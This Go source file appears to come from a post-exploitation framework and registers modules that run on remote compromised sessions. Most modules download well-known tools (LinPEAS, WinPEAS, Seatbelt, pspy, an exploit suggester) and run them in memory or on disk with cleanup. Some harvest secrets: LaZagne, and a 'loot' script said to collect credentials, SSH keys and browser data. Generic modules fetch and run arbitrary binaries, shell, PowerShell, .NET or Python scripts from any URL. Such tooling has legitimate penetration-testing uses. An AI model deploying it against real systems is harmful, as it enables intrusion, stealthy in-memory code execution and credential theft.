package internal

import (
	"context"
	"fmt"
	"sort"
	"time"
)

// Module interface for all gummy modules
type Module interface {
	Name() string          // Module identifier (e.g., "peas", "lse", "sh")
	Category() string      // Category (e.g., "linux", "windows", "custom")
	Description() string   // Short description
	ExecutionMode() string // "memory", "disk-cleanup"
	Run(ctx context.Context, session *SessionInfo, args []string) error
}

// ModuleRegistry holds all registered modules
type ModuleRegistry struct {
	modules map[string]Module
}

var globalRegistry *ModuleRegistry

// GetModuleRegistry returns the global module registry (singleton)
func GetModuleRegistry() *ModuleRegistry {
	if globalRegistry == nil {
		globalRegistry = NewModuleRegistry()
		// Linux modules
		globalRegistry.Register(&PEASModule{})
		globalRegistry.Register(&LSEModule{})
		globalRegistry.Register(&LootModule{})
		globalRegistry.Register(&PSPYModule{})
		globalRegistry.Register(&LinExpModule{})
		// Windows modules
		globalRegistry.Register(&WinPEASModule{})
		globalRegistry.Register(&SeatbeltModule{})
		globalRegistry.Register(&LaZagneModule{})
		// Custom modules (generic runners)
		globalRegistry.Register(&ELFModule{})
		globalRegistry.Register(&ShellScriptModule{})
		globalRegistry.Register(&PowerShellScriptModule{})
		globalRegistry.Register(&DotNetAssemblyModule{})
		globalRegistry.Register(&PythonScriptModule{})
	}
	return globalRegistry
}

// NewModuleRegistry creates a new module registry
func NewModuleRegistry() *ModuleRegistry {
	return &ModuleRegistry{
		modules: make(map[string]Module),
	}
}

// Register adds a module to the registry
func (r *ModuleRegistry) Register(module Module) {
	r.modules[module.Name()] = module
}

// Get retrieves a module by name
func (r *ModuleRegistry) Get(name string) (Module, bool) {
	mod, exists := r.modules[name]
	return mod, exists
}

// List returns all registered modules sorted by name
func (r *ModuleRegistry) List() []Module {
	var mods []Module
	for _, mod := range r.modules {
		mods = append(mods, mod)
	}

	// Sort by name
	sort.Slice(mods, func(i, j int) bool {
		return mods[i].Name() < mods[j].Name()
	})

	return mods
}

// ListByCategory returns all modules grouped by category
func (r *ModuleRegistry) ListByCategory() map[string][]Module {
	categories := make(map[string][]Module)

	for _, mod := range r.modules {
		cat := mod.Category()
		categories[cat] = append(categories[cat], mod)
	}

	// Sort modules within each category
	for cat := range categories {
		sort.Slice(categories[cat], func(i, j int) bool {
			return categories[cat][i].Name() < categories[cat][j].Name()
		})
	}

	return categories
}

// ============================================================================
// Module URLs
// ============================================================================

const (
	// Linux
	URL_LINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
	URL_LSE     = "https://github.com/chsoares/linux-smart-enumeration/raw/refs/heads/master/lse.sh"
	URL_LOOT    = "https://github.com/chsoares/ezpz/raw/refs/heads/main/utils/loot.sh"
	URL_PSPY64  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
	URL_LINEXP  = "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh"

	// Windows
	URL_WINPEAS  = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
	URL_SEATBELT = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
	URL_LAZAGNE  = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"
)

// ============================================================================
// Linux Modules
// ============================================================================

// PEASModule - LinPEAS privilege escalation scanner
type PEASModule struct{}

func (m *PEASModule) Name() string          { return "peas" }
func (m *PEASModule) Category() string      { return "linux" }
func (m *PEASModule) Description() string   { return "Run LinPEAS privilege escalation scanner" }
func (m *PEASModule) ExecutionMode() string { return "memory" }

func (m *PEASModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	return session.RunScriptInMemory(ctx, URL_LINPEAS, args)
}

// LSEModule - Linux Smart Enumeration
type LSEModule struct{}

func (m *LSEModule) Name() string          { return "lse" }
func (m *LSEModule) Category() string      { return "linux" }
func (m *LSEModule) Description() string   { return "Run Linux Smart Enumeration" }
func (m *LSEModule) ExecutionMode() string { return "memory" }

func (m *LSEModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		args = []string{"-l1"}
	}
	return session.RunScriptInMemory(ctx, URL_LSE, args)
}

// PSPYModule - Monitor processes without root (pspy64)
type PSPYModule struct{}

func (m *PSPYModule) Name() string          { return "pspy" }
func (m *PSPYModule) Category() string      { return "linux" }
func (m *PSPYModule) Description() string   { return "Run pspy process monitor" }
func (m *PSPYModule) ExecutionMode() string { return "disk-cleanup" }

func (m *PSPYModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	// pspy runs indefinitely — timeout after 5 minutes so the worker exits and cleanup runs
	ctx, cancel := context.WithTimeout(ctx, 5*time.Minute)
	defer cancel()
	return session.RunBinary(ctx, URL_PSPY64, args)
}

// LootModule - ezpz post-exploitation script (credentials, SSH keys, browser data)
type LootModule struct{}

func (m *LootModule) Name() string          { return "loot" }
func (m *LootModule) Category() string      { return "linux" }
func (m *LootModule) Description() string   { return "Run ezpz post-exploitation script" }
func (m *LootModule) ExecutionMode() string { return "memory" }

func (m *LootModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	return session.RunScriptInMemory(ctx, URL_LOOT, args)
}

// LinExpModule - Linux Exploit Suggester
type LinExpModule struct{}

func (m *LinExpModule) Name() string          { return "linexp" }
func (m *LinExpModule) Category() string      { return "linux" }
func (m *LinExpModule) Description() string   { return "Run Linux Exploit Suggester" }
func (m *LinExpModule) ExecutionMode() string { return "memory" }

func (m *LinExpModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	return session.RunScriptInMemory(ctx, URL_LINEXP, args)
}

// ============================================================================
// Windows Modules
// ============================================================================

// WinPEASModule - WinPEAS privilege escalation scanner (.NET assembly, in-memory)
type WinPEASModule struct{}

func (m *WinPEASModule) Name() string          { return "winpeas" }
func (m *WinPEASModule) Category() string      { return "windows" }
func (m *WinPEASModule) Description() string   { return "Run WinPEAS privilege escalation scanner" }
func (m *WinPEASModule) ExecutionMode() string { return "memory" }

func (m *WinPEASModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	return session.RunDotNetInMemory(ctx, URL_WINPEAS, args)
}

// SeatbeltModule - Seatbelt system enumeration (.NET assembly, in-memory)
type SeatbeltModule struct{}

func (m *SeatbeltModule) Name() string          { return "seatbelt" }
func (m *SeatbeltModule) Category() string      { return "windows" }
func (m *SeatbeltModule) Description() string   { return "Run Seatbelt system enumeration" }
func (m *SeatbeltModule) ExecutionMode() string { return "memory" }

func (m *SeatbeltModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		args = []string{"-group=all"}
	}
	return session.RunDotNetInMemory(ctx, URL_SEATBELT, args)
}

// LaZagneModule - LaZagne credential harvester (native binary, disk + cleanup)
type LaZagneModule struct{}

func (m *LaZagneModule) Name() string          { return "lazagne" }
func (m *LaZagneModule) Category() string      { return "windows" }
func (m *LaZagneModule) Description() string   { return "Run LaZagne credential harvester" }
func (m *LaZagneModule) ExecutionMode() string { return "disk-cleanup" }

func (m *LaZagneModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		args = []string{"all"}
	}
	return session.RunBinary(ctx, URL_LAZAGNE, args)
}

// ============================================================================
// Custom Modules (generic runners)
// ============================================================================

// ELFModule - Run arbitrary Linux ELF/native binary from URL or binbag (disk + cleanup)
type ELFModule struct{}

func (m *ELFModule) Name() string     { return "elf" }
func (m *ELFModule) Category() string { return "custom" }
func (m *ELFModule) Description() string {
	return "Run arbitrary Linux ELF/native binary (disk + cleanup)"
}
func (m *ELFModule) ExecutionMode() string { return "disk-cleanup" }

func (m *ELFModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: run elf <url|filename> [binary args...]")
	}

	source := args[0]
	binaryArgs := args[1:]

	return session.RunBinary(ctx, source, binaryArgs)
}

// ShellScriptModule - Run arbitrary shell script from URL
type ShellScriptModule struct{}

func (m *ShellScriptModule) Name() string          { return "sh" }
func (m *ShellScriptModule) Category() string      { return "custom" }
func (m *ShellScriptModule) Description() string   { return "Run arbitrary bash script from URL" }
func (m *ShellScriptModule) ExecutionMode() string { return "memory" }

func (m *ShellScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: run sh <url> [script args...]")
	}

	url := args[0]
	scriptArgs := args[1:]

	return session.RunScriptInMemory(ctx, url, scriptArgs)
}

// PowerShellScriptModule - Run arbitrary PowerShell script from URL
type PowerShellScriptModule struct{}

func (m *PowerShellScriptModule) Name() string     { return "ps1" }
func (m *PowerShellScriptModule) Category() string { return "custom" }
func (m *PowerShellScriptModule) Description() string {
	return "Run arbitrary PowerShell script from URL"
}
func (m *PowerShellScriptModule) ExecutionMode() string { return "memory" }

func (m *PowerShellScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: run ps1 <url> [script args...]")
	}

	url := args[0]
	scriptArgs := args[1:]

	return session.RunPowerShellInMemory(ctx, url, scriptArgs)
}

// DotNetAssemblyModule - Run arbitrary .NET assembly from URL
type DotNetAssemblyModule struct{}

func (m *DotNetAssemblyModule) Name() string          { return "dotnet" }
func (m *DotNetAssemblyModule) Category() string      { return "custom" }
func (m *DotNetAssemblyModule) Description() string   { return "Run arbitrary .NET assembly from URL" }
func (m *DotNetAssemblyModule) ExecutionMode() string { return "memory" }

func (m *DotNetAssemblyModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: run dotnet <url> [assembly args...]")
	}

	url := args[0]
	assemblyArgs := args[1:]

	return session.RunDotNetInMemory(ctx, url, assemblyArgs)
}

// PythonScriptModule - Run arbitrary Python script from URL
type PythonScriptModule struct{}

func (m *PythonScriptModule) Name() string          { return "py" }
func (m *PythonScriptModule) Category() string      { return "custom" }
func (m *PythonScriptModule) Description() string   { return "Run arbitrary Python script from URL" }
func (m *PythonScriptModule) ExecutionMode() string { return "memory" }

func (m *PythonScriptModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: run py <url> [script args...]")
	}

	url := args[0]
	scriptArgs := args[1:]

	return session.RunPythonInMemory(ctx, url, scriptArgs)
}
